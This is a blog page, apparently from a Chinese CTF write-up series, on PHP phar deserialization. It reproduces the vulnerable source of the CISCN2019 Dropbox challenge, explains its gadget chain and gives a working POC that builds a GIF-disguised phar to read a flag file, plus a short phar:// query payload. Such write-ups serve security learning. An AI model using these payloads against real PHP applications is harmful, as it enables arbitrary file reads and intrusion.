@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>CTF反序列化题目总结(持续更新....) - Da4er&#39;s Blogs</title>
+
+
+    <meta name="description" content="一. 入门题目代码如下：  很简单的利用phar进行反序列化，POC如下：   1?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();  查看生成的phar文件：    二.[CISCN2019 华北赛区 Day1 Web1]Dropbox题目知识点为：任意文件下载加phar反序列化。我们直接看phar反序列化的地方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF反序列化题目总结(持续更新....)">
+<meta property="og:url" content="https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html">
+<meta property="og:site_name" content="Da4er&#39;s Blogs">
+<meta property="og:description" content="一. 入门题目代码如下：  很简单的利用phar进行反序列化，POC如下：   1?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();  查看生成的phar文件：    二.[CISCN2019 华北赛区 Day1 Web1]Dropbox题目知识点为：任意文件下载加phar反序列化。我们直接看phar反序列化的地方">
+<meta property="og:image" content="https://da4er.top/images/og_image.png">
+<meta property="article:published_time" content="2020-03-15T06:59:53.000Z">
+<meta property="article:modified_time" content="2020-03-15T07:02:02.734Z">
+<meta property="article:author" content="Da4er&#39;s">
+<meta property="article:tag" content="Da4er">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://da4er.top/images/og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/3.jpg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<link rel="alternate" href="/atom.xml" title="Da4er's Blogs" type="application/atom+xml">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/3.jpg" alt="CTF反序列化题目总结(持续更新....)" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页面</a>
+                
+                <a class="navbar-item"
+                href="/archives">全部文章</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Da4er">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="Buscar" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-03-15T06:59:53.000Z">2020-03-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 minutes leer (Acerca de 826 palabras)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                CTF反序列化题目总结(持续更新....)
+            
+        </h1>
+        <div class="content">
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+
+<h3 id="一-入门题目"><a href="#一-入门题目" class="headerlink" title="一. 入门题目"></a>一. 入门题目</h3><p>代码如下：</p>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er">
+<p>很简单的利用phar进行反序列化，POC如下：</p>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er">
+<p>查看生成的phar文件：</p>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er">
+
+<hr>
+<h3 id="二-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#二-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="二.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>二.[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>题目知识点为：任意文件下载加phar反序列化。<br>我们直接看phar反序列化的地方：<br>delete.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个关键在于class这个文件中，分析如下：</p>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er">
+<p>我们可以发现一个File类里面的close函数有一个文件处理函数，那么关键就在于怎么把这个close函数调用。<br>通过分析发现在FileList类里面有个<strong>call魔法函数，也就是说我们可以通过这个魔法函数触发File类里面的close函数。那么接着分析找到User类里面也有个close函数是在</strong>destruct()，那么思路就很清楚了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.构造User类</span><br><span class="line">2.让User类的成员变量再构造一个FileList类</span><br><span class="line">3.让FileList类里面的$files数组里面包含File类</span><br><span class="line">4.File类的$filename变量为flag文件</span><br></pre></td></tr></table></figure>
+<p>POC如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Poc</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-15</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File(<span class="string">'/flag.txt'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er">
+<p>再delete页面得到flag：</p>
+<img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er">
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>Wechat</span>
+    <div class="qrcode"><img src="/images/1.png" alt="Wechat"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html">
+                <span class="level-item">利用phar进行反序列化扩展攻击简单总结</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Enlaces
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://www.cnblogs.com/wangtanzhi/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">叹之师傅&#39;s Blogs</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.cnblogs.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://123.207.99.2/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">D-R0S1&#39;s Blogs</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">123.207.99.2</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://www.cnblogs.com/zane-s/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Zane&#39;s Blogs</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.cnblogs.com</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categorías
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">36</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Python/">
+            <span class="level-start">
+                <span class="level-item">Python</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+            <span class="level-start">
+                <span class="level-item">Web安全&渗透测试</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">8</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+            <span class="level-start">
+                <span class="level-item">代码审计</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">6</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+            <span class="level-start">
+                <span class="level-item">学习笔记</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E5%BC%80%E5%8F%91/">
+            <span class="level-start">
+                <span class="level-item">开发</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E7%88%AC%E8%99%AB/">
+            <span class="level-start">
+                <span class="level-item">爬虫</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E9%9A%8F%E7%AC%94/">
+            <span class="level-start">
+                <span class="level-item">随笔</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Nube de etiquetas
+        </h3>
+        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 16.67px;">Web安全&渗透测试</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 13.33px;">代码审计</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 13.33px;">爬虫</a>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
